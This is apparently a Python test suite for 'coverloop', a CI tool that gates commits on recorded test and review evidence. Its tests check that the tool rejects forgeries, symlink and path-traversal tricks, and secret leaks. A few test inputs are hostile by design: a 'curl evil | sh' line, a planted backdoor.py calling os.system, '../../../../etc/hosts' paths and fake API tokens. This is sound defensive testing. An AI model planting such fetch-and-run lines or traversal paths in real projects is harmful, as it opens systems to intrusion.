#!/usr/bin/env python3
"""Tests for `coverloop` (init/attest/gate) against real temporary git repos.

Run from the repo root:  python3 -m unittest discover -s tests -v
No third-party dependencies.
"""
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'bin'))
CLI = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "coverloop")


def run(args, cwd):
    return subprocess.run(
        [sys.executable, CLI] + args, cwd=cwd, capture_output=True, text=True, timeout=60
    )


def sh(args, cwd):
    subprocess.run(args, cwd=cwd, capture_output=True, text=True, check=True)


class GateTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = self.tmp.name
        sh(["git", "init", "-q", "-b", "main"], self.repo)
        sh(["git", "config", "user.email", "t@example.com"], self.repo)
        sh(["git", "config", "user.name", "tester"], self.repo)
        self.write("app.py", "print('v1')\n")
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "base"], self.repo)
        self.base_sha = self.git_out(["rev-parse", "HEAD"])

    def tearDown(self):
        self.tmp.cleanup()

    # helpers -------------------------------------------------------
    def write(self, rel, content):
        path = os.path.join(self.repo, rel)
        os.makedirs(os.path.dirname(path) or self.repo, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

    def commit(self, rel, content, msg="change"):
        self.write(rel, content)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", msg], self.repo)
        return self.git_out(["rev-parse", "HEAD"])

    def git_out(self, args):
        return subprocess.run(
            ["git"] + args, cwd=self.repo, capture_output=True, text=True, check=True
        ).stdout.strip()

    def init_project(self, test_command="true"):
        r = run(["init", "--test-command", test_command], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        # Commit the scaffolding on its own, then move base past it, so later
        # "docs-only" assertions aren't polluted by .coverloop/config.json
        # (config changes are deliberately never waivable).
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "coverloop scaffolding"], self.repo)
        self.base_sha = self.git_out(["rev-parse", "HEAD"])

    def gate_json(self, extra=None):
        r = run(["gate", "--json"] + (extra or []), self.repo)
        try:
            return r.returncode, json.loads(r.stdout)
        except json.JSONDecodeError:
            self.fail(f"gate --json emitted non-JSON:\nstdout={r.stdout}\nstderr={r.stderr}")

    # fail-closed basics --------------------------------------------
    def test_gate_outside_git_repo_is_usage_error(self):
        with tempfile.TemporaryDirectory() as empty:
            r = run(["gate", "--tier", "L1"], empty)
            self.assertEqual(r.returncode, 2)

    def test_gate_without_tier_or_report_fails(self):
        r = run(["gate"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertIn("no risk tier", r.stderr)

    def test_L1_without_any_report_fails(self):
        code, out = self.gate_json(["--tier", "L1"])
        self.assertEqual(code, 1)
        self.assertEqual(out["verdict"], "fail")

    def test_L0_passes_with_no_evidence(self):
        code, out = self.gate_json(["--tier", "L0"])
        self.assertEqual(code, 0)
        self.assertEqual(out["verdict"], "pass")

    def test_corrupt_report_fails_closed(self):
        self.init_project()
        sha = self.git_out(["rev-parse", "HEAD"])
        self.write(f".coverloop/reports/{sha}.json", "{not json")
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # attest + tiers -------------------------------------------------
    def test_L1_passes_after_green_tests(self):
        self.init_project(test_command="true")
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        code, out = self.gate_json()
        self.assertEqual(code, 0)
        self.assertEqual(out["tier"], "L1")

    def test_failing_tests_recorded_and_gate_fails(self):
        self.init_project(test_command="false")
        r = run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(r.returncode, 1)  # attest surfaces the red run
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        self.assertEqual(out["verdict"], "fail")

    def test_L2_requires_codex(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        failing = [c["check"] for c in out["checks"] if c["status"] != "pass"]
        self.assertEqual(failing, ["codex"])
        run(["attest", "--codex", "pass"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)

    def test_L2_open_codex_findings_fail(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-findings", "2"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)
        self.assertIn("open findings: 2", json.dumps(out))

    def test_L3_requires_everything(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 1)  # human gate still missing
        failing = [c["check"] for c in out["checks"] if c["status"] != "pass"]
        self.assertEqual(failing, ["human_gate"])
        r = run(["attest", "--approve", "--approver", "daniel"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        code, out = self.gate_json()
        self.assertEqual(code, 0)
        self.assertEqual(out["verdict"], "pass")

    def test_approve_without_approver_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        r = run(["attest", "--approve"], self.repo)
        self.assertEqual(r.returncode, 2)

    # staleness ------------------------------------------------------
    def test_new_commit_invalidates_old_evidence(self):
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "daniel"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)
        self.commit("app.py", "print('v2')  # sneaky post-approval change\n")
        r = run(["gate", "--tier", "L3"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_report_sha_mismatch_fails(self):
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        path = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        data["commit"] = "0" * 40  # forged binding
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # the committed-evidence flow (Codex P0 regression) ---------------
    def test_committed_report_still_gates_the_change(self):
        """attest -> COMMIT the report -> gate must pass at the new HEAD.
        This is the CI flow: the report travels inside the PR."""
        self.init_project()
        self.commit("app.py", "print('v2')\n")
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)  # new HEAD
        code, out = self.gate_json()
        self.assertEqual(code, 0, out)
        self.assertEqual(out["verdict"], "pass")

    def test_code_change_after_committed_evidence_fails(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        code, _ = self.gate_json()
        self.assertEqual(code, 0)
        self.commit("app.py", "print('sneaky v3')\n")  # code after evidence
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_attest_inherits_evidence_across_evidence_commits(self):
        """Multi-step L3: attest tests, commit, attest reviews later —
        earlier evidence must carry forward, not be lost."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence: tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "daniel"], self.repo)
        code, out = self.gate_json()
        self.assertEqual(code, 0, out)
        checks = {c["check"]: c["status"] for c in out["checks"]}
        self.assertEqual(checks.get("tests"), "pass")  # inherited, not lost

    # config is required for non-L0 (Codex P1 regression) -------------
    def test_missing_config_fails_non_L0(self):
        run(["attest", "--tier", "L1"], self.repo)  # report without init
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)
        self.assertIn("config", r.stdout + r.stderr)

    def test_corrupt_config_fails_non_L0(self):
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.write(".coverloop/config.json", "{broken")
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)

    # malformed reports fail every tier (Codex P2 regression) ---------
    def test_corrupt_report_fails_even_at_L0(self):
        self.init_project()
        sha = self.git_out(["rev-parse", "HEAD"])
        self.write(f".coverloop/reports/{sha}.json", "{not json")
        r = run(["gate", "--tier", "L0"], self.repo)
        self.assertEqual(r.returncode, 1)

    # --ci works alongside --json (Codex P2 regression) ---------------
    def test_ci_annotations_survive_json_mode(self):
        self.init_project()
        r = run(["gate", "--tier", "L2", "--ci", "--json"], self.repo)
        self.assertEqual(r.returncode, 1)
        json.loads(r.stdout)  # stdout must stay pure JSON
        self.assertIn("::error", r.stderr)

    # captured (tool-produced) evidence ------------------------------
    def test_codex_run_captures_hashed_transcript(self):
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "printf 'CLEAN: no findings\\n'"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")) as f:
            rep = json.load(f)
        self.assertEqual(rep["codex"]["source"], "captured")
        self.assertIn("output_sha256", rep["codex"])
        self.assertEqual(rep["codex"]["command"], "printf 'CLEAN: no findings\\n'")
        # the transcript log exists and its hash matches what was recorded
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        self.assertTrue(os.path.exists(log))
        with open(log, "rb") as f:
            digest = hashlib.sha256(f.read()).hexdigest()
        self.assertEqual(digest, rep["codex"]["output_sha256"])

    def test_gate_detail_distinguishes_captured_from_self_attested(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # bare claim
        _, out = self.gate_json()
        codex_detail = [c["detail"] for c in out["checks"] if c["check"] == "codex"][0]
        self.assertIn("self-attested", codex_detail)
        run(["attest", "--codex", "pass", "--codex-run", "echo ok"], self.repo)
        _, out = self.gate_json()
        codex_detail = [c["detail"] for c in out["checks"] if c["check"] == "codex"][0]
        self.assertIn("captured", codex_detail)

    def test_run_without_verdict_is_rejected(self):
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex-run", "echo hi"], self.repo)
        self.assertEqual(r.returncode, 2)

    def test_require_captured_rejects_self_attested(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # self-attested
        self.assertEqual(self.gate_json()[0], 0)                       # passes normally
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 1)                                      # but not with the flag
        self.assertIn("SELF-ATTESTED", json.dumps(out))

    def test_require_captured_accepts_captured(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo reviewed"], self.repo)
        code, _ = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0)

    def _forge_source_captured(self, sha, sha256="deadbeef"):
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "captured"
        rep["codex"]["output_file"] = f".coverloop/reports/{sha}.codex.log"
        rep["codex"]["output_sha256"] = sha256
        with open(p, "w") as f:
            json.dump(rep, f)

    def test_forged_captured_without_transcript_is_rejected(self):
        """source:'captured' with no real transcript must FAIL even without
        --require-captured (Codex v2.6.2 P1: the label must not be a lie)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # self-attested
        sha = self.git_out(["rev-parse", "HEAD"])
        self._forge_source_captured(sha)  # flip to 'captured', bogus hash, no log
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)
        r = run(["gate", "--tier", "L2", "--require-captured"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_tampered_transcript_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo original"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # valid capture passes
        sha = self.git_out(["rev-parse", "HEAD"])
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        with open(log, "a") as f:
            f.write("TAMPERED AFTER ATTEST\n")  # bytes change -> hash mismatch
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_path_traversal_is_rejected(self):
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["source"] = "captured"
        rep["codex"]["output_file"] = "../../../../etc/hosts"  # escape attempt
        rep["codex"]["output_sha256"] = "0" * 64
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_replay_of_other_commit_log_rejected(self):
        """A report may only cite THIS commit's transcript — pointing at a real
        log named for a different commit (replay) is rejected (Codex round-2)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo genuine review"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        rdir = os.path.join(self.repo, ".coverloop", "reports")
        other = "0123456789abcdef0123456789abcdef01234567"
        with open(os.path.join(rdir, f"{sha}.codex.log"), "rb") as f:
            data = f.read()
        with open(os.path.join(rdir, f"{other}.codex.log"), "wb") as f:
            f.write(data)  # identical content -> identical hash, only the NAME differs
        p = os.path.join(rdir, f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["output_file"] = f".coverloop/reports/{other}.codex.log"
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_captured_symlink_escape_rejected(self):
        """A transcript that is a symlink pointing outside reports/ is rejected
        even if its target hashes to the recorded digest (Codex round-2)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo real review"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        log = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.codex.log")
        outside = os.path.join(self.repo, "outside.txt")
        with open(log) as f:
            content = f.read()
        with open(outside, "w") as f:
            f.write(content)  # same content -> hash still matches
        os.remove(log)
        os.symlink(outside, log)
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_failed_reviewer_capture_is_rejected(self):
        """An honest user whose reviewer command FAILS (nonzero exit) must not
        have that error transcript accepted as evidence (Codex round-4)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", "echo boom; exit 7"], self.repo)
        self.assertIn("exited 7", r.stderr)  # attest warns
        code, out = self.gate_json()
        self.assertEqual(code, 1)  # gate rejects even without --require-captured
        code, _ = self.gate_json(["--require-captured"])
        self.assertEqual(code, 1)

    def test_captured_reports_dir_symlink_rejected(self):
        """If .coverloop/reports itself is a symlink to an external dir, the
        transcript is off-tree and must be rejected (Codex round-3)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo real review"], self.repo)
        rdir = os.path.join(self.repo, ".coverloop", "reports")
        ext = tempfile.mkdtemp()
        for fn in os.listdir(rdir):
            with open(os.path.join(rdir, fn), "rb") as f:
                d = f.read()
            with open(os.path.join(ext, fn), "wb") as f:
                f.write(d)
        for fn in os.listdir(rdir):
            os.remove(os.path.join(rdir, fn))
        os.rmdir(rdir)
        os.symlink(ext, rdir)  # reports/ now points off-tree
        try:
            r = run(["gate", "--tier", "L2"], self.repo)
            self.assertEqual(r.returncode, 1)
        finally:
            os.remove(rdir)

    def test_captured_survives_attest_after_evidence_commit(self):
        """The inheritance re-bind keeps captured evidence valid: capture codex,
        commit the evidence, attest tests at the new HEAD, gate --require-captured."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", "echo reviewed"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        run(["attest", "--tests"], self.repo)  # inherits codex + re-binds its log
        code, out = self.gate_json(["--require-captured"])
        self.assertEqual(code, 0, out)

    # docs-only waiver ----------------------------------------------
    def test_L1_docs_only_diff_waives_tests(self):
        self.init_project()
        self.commit("README.md", "# docs change only\n")
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        # no report exists at all -> still fails closed (report required)
        self.assertEqual(code, 1)
        run(["attest", "--tier", "L1"], self.repo)  # report with no test run
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 0)
        self.assertIn("waived", json.dumps(out))

    def test_L1_code_diff_does_not_get_waiver(self):
        self.init_project()
        self.commit("app.py", "print('v2')\n")
        run(["attest", "--tier", "L1"], self.repo)  # no test run recorded
        code, out = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    def test_config_change_is_never_waived_but_reports_are(self):
        self.init_project()
        # a VALID committed report artifact (<40-hex>.json) rides along -> waivable
        self.commit(".coverloop/reports/" + ("a" * 40) + ".json", "{}", "carry an old report")
        self.commit("README.md", "# docs\n")
        run(["attest", "--tier", "L1"], self.repo)
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 0)
        # but touching the gate's own config always demands the test gate
        self.commit(".coverloop/config.json",
                    json.dumps({"schema": "coverloop-config/v1", "test_command": "true"}))
        run(["attest", "--tier", "L1"], self.repo)
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    # ---- Phase-A audit regressions (P0/P1 fail-opens) ----
    def test_pinned_tier_is_a_floor_not_an_override(self):
        """P0 #1: an L3 report gated with a LOWER --tier/--min-tier must still
        require glm + human (floor, not override)."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)  # tests+codex only, no glm/human
        # bare gate (report says L3) -> FAIL (missing glm+human)
        self.assertEqual(self.gate_json()[0], 1)
        # the shipped CI recipe's downgrade attempt must NOT lower it
        for lower in ("L0", "L1", "L2"):
            code, out = self.gate_json(["--tier", lower])
            self.assertEqual(code, 1, f"--tier {lower} wrongly downgraded L3")
            failing = {c["check"] for c in out["checks"] if c["status"] != "pass"}
            self.assertTrue({"glm", "human_gate"} & failing)

    def test_min_tier_raises_the_floor(self):
        """--min-tier can only RAISE: an L1 report gated --min-tier L2 needs codex."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)                      # L1 passes on tests
        self.assertEqual(self.gate_json(["--min-tier", "L2"])[0], 1)  # raised -> needs codex

    def test_arbitrary_file_under_reports_is_not_evidence_only(self):
        """P0 #2: a non-artifact file under reports/ is a real code change and
        must invalidate inherited evidence."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # evidence-only commit rides
        # now smuggle real code under reports/
        self.commit(".coverloop/reports/backdoor.py", "import os\nos.system('id')\n")
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_attest_cannot_silently_downgrade_tier(self):
        """P1 #3: attest --tier L0 on an L3 report must be refused (monotonic)."""
        self.init_project()
        run(["attest", "--tier", "L3", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        run(["attest", "--glm", "pass"], self.repo)
        run(["attest", "--approve", "--approver", "d"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # full L3 passes
        r = run(["attest", "--tier", "L0"], self.repo)
        self.assertEqual(r.returncode, 2)  # refused
        self.assertIn("downgrade", r.stderr)
        self.assertEqual(self.gate_json()[0], 0)  # still L3, unchanged

    def test_docs_waiver_rejects_code_named_like_docs(self):
        """P1 #4/#5: basename collision (src/CHANGELOG) and executable under
        docs/ (docs/deploy.sh) must NOT waive the test gate."""
        for path, content in [("src/CHANGELOG", "print('code')\n"),
                              ("docs/deploy.sh", "curl evil | sh\n"),
                              ("lib/README.md", "print('code masquerading')\n")]:
            self.init_project()
            self.commit(path, content)
            run(["attest", "--tier", "L1"], self.repo)  # no tests
            code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
            self.assertEqual(code, 1, f"{path} wrongly waived the test gate")

    def test_forged_tests_command_mismatch_is_rejected(self):
        """P1 #6: a tests entry whose command != config's test_command fails."""
        self.init_project(test_command="true")
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass", "--codex-run", "echo ok"], self.repo)
        self.assertEqual(self.gate_json(["--require-captured"])[0], 0)  # genuine passes
        # hand-forge the tests command to something that never matches config
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["tests"]["command"] = "echo fake"
        with open(p, "w") as f:
            json.dump(rep, f)
        r = run(["gate", "--tier", "L2", "--require-captured"], self.repo)
        self.assertEqual(r.returncode, 1)

    # ---- Phase-B audit regressions (privacy / redaction) ----
    def _read_log(self, name="codex"):
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.{name}.log")) as f:
            return f.read()

    def test_captured_transcript_is_secret_redacted(self):
        """P1 #7: a secret in reviewer output must be redacted before the log is
        written (never committed to git)."""
        self.init_project()
        key = "sk-" + "or-v1-abcdef0123456789abcdef0123456789"
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", f"echo 'OPENROUTER_API_KEY={key}'"], self.repo)
        content = self._read_log()
        self.assertNotIn(key, content)
        self.assertIn("REDACTED", content)

    def test_failed_reviewer_run_withholds_secret_dump(self):
        """P1 #8: a FAILED run's transcript (env dump) is withheld, not committed."""
        self.init_project()
        ant = "sk-" + "ant-api03-" + "X" * 24
        dburl = "postgres://u:" + "p4ss@h/db"
        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run",
             f"echo 'DATABASE_URL={dburl}'; echo {ant}; exit 3"], self.repo)
        content = self._read_log()
        self.assertNotIn("p4ss@h", content)
        self.assertNotIn(ant[3:15], content)
        self.assertIn("withheld", content)

    def test_reviewer_command_string_is_redacted(self):
        """P2 #16: a secret on the reviewer command line is redacted in the report."""
        self.init_project()
        proj = "sk-" + "proj-" + "A" * 24
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", f"echo hi --token {proj}"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        with open(os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")) as f:
            rep = json.load(f)
        self.assertNotIn(proj[3:15], rep["codex"]["command"])

    def test_non_utf8_reviewer_output_does_not_crash(self):
        """P1 #10: non-UTF-8 reviewer output records cleanly instead of crashing."""
        self.init_project()
        r = run(["attest", "--tier", "L2", "--codex", "pass",
                 "--codex-run", r"printf '\xff\xfe bad bytes'"], self.repo)
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_secret_filter_covers_common_token_shapes(self):
        """P1 #9: scan() + redact() catch GitHub/AWS/Slack/Google/bearer tokens."""
        import importlib.util
        fp = os.path.join(os.path.dirname(CLI), "glm_secret_filter.py")
        spec = importlib.util.spec_from_file_location("gsf_test", fp)
        gsf = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(gsf)
        for secret in ["ghp_" + "a" * 36, "AKIA" + "IOSFODNN7EXAMPLE",
                       "xoxb-" + "123456789012-abcdefghijklmno", "AIza" + "b" * 35,
                       "Authorization: Bearer " + "x" * 30]:
            self.assertTrue(gsf.scan(secret), f"scan missed {secret[:12]}")
            self.assertIn("REDACTED", gsf.redact(secret), f"redact missed {secret[:12]}")

    def test_config_base_cannot_waive_tests_on_code_change(self):
        """Codex round-3 P1: default_base ships inside the PR, so it must not
        be trusted to compute the waiver diff. A code change + a report with no
        tests must FAIL when gated with no explicit --base (fail closed)."""
        self.init_project()
        # commit A: real code change + a config that (historically) pointed the
        # base at itself; the report records NO test run
        self.write("app.py", "print('unshipped code change')\n")
        self.write(".coverloop/config.json", json.dumps(
            {"schema": "coverloop-config/v1", "test_command": "true",
             "default_base": "HEAD~1"}))  # attacker-controlled hint — must be ignored
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "A: code + evil config"], self.repo)
        run(["attest", "--tier", "L1"], self.repo)  # note: no --tests
        sh(["git", "add", ".coverloop/reports"], self.repo)
        sh(["git", "commit", "-qm", "B: report only"], self.repo)
        # No trusted --base -> waiver cannot apply -> tests required -> FAIL
        r = run(["gate", "--tier", "L1"], self.repo)
        self.assertEqual(r.returncode, 1)
        # And with the REAL base, the code change is visible -> also FAIL
        r = run(["gate", "--tier", "L1", "--base", self.base_sha], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_rename_into_docs_cannot_smuggle_code_past_waiver(self):
        """With diff.renames on, a code file renamed into docs/ must NOT
        count as docs-only (Codex round-2 P1 regression)."""
        self.init_project()
        sh(["git", "config", "diff.renames", "true"], self.repo)
        os.makedirs(os.path.join(self.repo, "docs"), exist_ok=True)
        sh(["git", "mv", "app.py", "docs/app.md"], self.repo)
        sh(["git", "commit", "-qm", "sneaky rename"], self.repo)
        run(["attest", "--tier", "L1"], self.repo)  # no test run recorded
        code, _ = self.gate_json(["--tier", "L1", "--base", self.base_sha])
        self.assertEqual(code, 1)

    def test_docs_only_waiver_never_applies_to_L2(self):
        """P1 #11: assert the SPECIFIC tests check fails at L2 (not just
        returncode==1), so a regression that leaks the waiver to L2 is caught
        even though the missing codex check would also fail the gate."""
        self.init_project()
        self.commit("README.md", "# docs\n")
        run(["attest", "--tier", "L2", "--codex", "pass"], self.repo)  # codex passes
        code, out = self.gate_json(["--tier", "L2", "--base", self.base_sha])
        self.assertEqual(code, 1)
        tests_check = [c for c in out["checks"] if c["check"] == "tests"][0]
        self.assertEqual(tests_check["status"], "FAIL")  # waiver must NOT apply at L2

    def test_report_json_symlink_is_rejected(self):
        """P2 #14: a report JSON reached through a symlink is off-tree evidence."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # valid report passes
        sha = self.git_out(["rev-parse", "HEAD"])
        rp = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        ext = os.path.join(self.repo, "offtree.json")
        os.rename(rp, ext)
        os.symlink(ext, rp)  # report is now a symlink
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_artifact_regex_rejects_disguised_extensions(self):
        """Codex v2.7 review: <sha>.py.log / <sha>.pwn.json are NOT artifacts,
        so they can't ride as evidence-only."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)
        self.commit(".coverloop/reports/" + ("b" * 40) + ".py.log", "import os\n")
        self.assertEqual(run(["gate", "--tier", "L2"], self.repo).returncode, 1)

    def test_no_configured_test_command_fails_closed(self):
        """Release-gate review: gate must NOT pass a forged tests:pass when the
        config has no test_command (None was wrongly treated as a match)."""
        self.init_project()
        run(["attest", "--tier", "L2", "--tests"], self.repo)
        run(["attest", "--codex", "pass"], self.repo)
        self.assertEqual(self.gate_json()[0], 0)  # normally passes
        # remove test_command from config, keep a forged passing tests entry
        self.write(".coverloop/config.json", json.dumps({"schema": "coverloop-config/v1"}))
        r = run(["gate", "--tier", "L2"], self.repo)
        self.assertEqual(r.returncode, 1)

    def test_secret_named_assignment_is_redacted(self):
        """Release-gate review B: a secret-NAMED assignment with an unknown-shape
        value (VERCEL_TOKEN=...) is redacted in a captured transcript."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass",
             "--codex-run", "echo 'VERCEL_TOKEN=plainUnmatchedValue123'"], self.repo)
        content = self._read_log()
        self.assertNotIn("plainUnmatchedValue123", content)
        self.assertIn("REDACTED", content)

    def test_inheritance_drops_forged_transcript_path(self):
        """Release-gate review A: a forged ancestor report pointing output_file
        at an arbitrary file must NOT be copied into the tree on inheritance."""
        self.init_project()
        run(["attest", "--tier", "L2", "--codex", "pass", "--codex-run", "echo reviewed"], self.repo)
        sha = self.git_out(["rev-parse", "HEAD"])
        p = os.path.join(self.repo, ".coverloop", "reports", f"{sha}.json")
        with open(p) as f:
            rep = json.load(f)
        rep["codex"]["output_file"] = "/etc/hosts"  # forged: arbitrary file
        with open(p, "w") as f:
            json.dump(rep, f)
        sh(["git", "add", "-A"], self.repo)
        sh(["git", "commit", "-qm", "evidence with forged path"], self.repo)
